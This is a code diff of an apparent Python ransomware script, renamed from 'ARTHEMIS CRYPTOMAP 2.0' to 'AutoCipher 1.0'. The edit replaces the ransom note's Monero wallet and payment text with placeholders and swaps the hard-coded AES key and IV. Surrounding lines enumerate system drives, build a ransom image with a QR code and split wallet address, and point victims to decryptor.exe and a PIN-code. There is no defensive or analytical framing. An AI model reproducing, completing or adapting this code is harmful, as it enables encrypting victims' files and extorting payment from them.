@@ -1,5 +1,7 @@
 #-*- coding: utf-8 -*-
-# ARTHEMIS CRYPTOMAP 2.0
+# AutoCipher 1.0
+# Creator: Malcolm Mami
+
 import os
 from os.path import expanduser
 import win32api  # get all system drives
@@ -20,11 +22,11 @@ draw = ImageDraw.Draw(im)   # create a drawing object that is
 red = (255,0,0)             # color of our text
 
 # full address
-full_addr = ("47WwdAwspQG8oD9We1dKFL96DwgCjRrPnhSLuFXMsyPFfw3eLRxNzBuKS6okHatTGTJFSooydeACuWBJqNsHxXgXFfgLzAz")
+full_addr = ("ADD HEX INFO HERE TO GENERATE A QR-CODE LINK")
 # creating img file
 img = qrcode.make(full_addr)
 
-# ACCOUNT
+# ACCOUNT (encrypted secret pin)
 accountA = ("47WwdAwspQG8oD9We1dKFL96DwgCjRrPnh")
 accountB = ("SLuFXMsyPFfw3eLRxNzBuKS6okHatTGTJF")
 accountC = ("SooydeACuWBJqNsHxXgXFfgLzAz")
@@ -45,9 +47,9 @@ text_pos9 = (60,410)
 text_pos10 = (60,440)
 
 text1 = ("YOUR DATA HAS BEEN ENCRYPTED")
-text2 = ("If you want it back, pay 1 MONERO (XMR) to this wallet:")
+text2 = ("If you want it back, - - - - - -")
 
-text4 = (accountA)
+text4 =  (accountA)
 text4b = (accountB)
 text4c = (accountC)
 
@@ -55,9 +57,9 @@ text5 = ("Inside : " + user_homepath)
 text5a = ("there is a zip archive named: dcp.zip")
 text6 = ("extract it and run decryptor.exe to unlock all your data.")
 text7 = ("To activate the decryption process you will need a PIN-CODE:")
-text8 = ("as soon as I see the money, an email will be sent to you with")
+text8 = ("- - - - Additional Info - - - - -")
 text9 = ("the PIN-CODE required to unlock decryptor.exe.")
-text10 = ("You can also use qrcode photo to link payment on the wallet.")
+text10 = ("Additional info . . . . .")
 
 fontsize = ImageFont.truetype('arial.ttf', 25)
 fontsize2 = ImageFont.truetype('consola.ttf', 28)
@@ -91,9 +93,7 @@ import base64
 from Crypto.Cipher import AES
 
 BLOCK_SIZE = 16
-#IV = 'q10mLtkP742W3xSd'
 IV = 'c8R1li6ctz03qeQp'	
-#secret = 'uP8yMqBe4gv76MhJklsGi13blcC0of3z'
 secret = 'x93kft29flwrYwcU9v0qazr16HxC3M1m'
 
 # Obtain sys drives
